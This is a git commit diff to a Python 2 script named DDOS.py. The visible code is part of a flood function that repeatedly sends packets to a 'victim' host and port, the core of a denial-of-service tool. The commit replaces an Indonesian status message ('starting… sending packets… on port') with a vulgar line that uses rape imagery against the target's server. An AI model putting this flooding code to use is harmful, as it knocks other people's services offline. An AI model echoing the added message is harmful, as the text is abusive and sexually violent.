5441cd942a8a45420c776c39154127d8897eba18
EinsteinPro <58723841+EinsteinPro@users.noreply.github.com>
2020-01-03 21:30:41 +0700

    Update DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mMaafTerpaksa \033[1;32m%s \033[1;91mKami Perkosa \033[1;32m%s \033[1;91mServer LonteMu \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
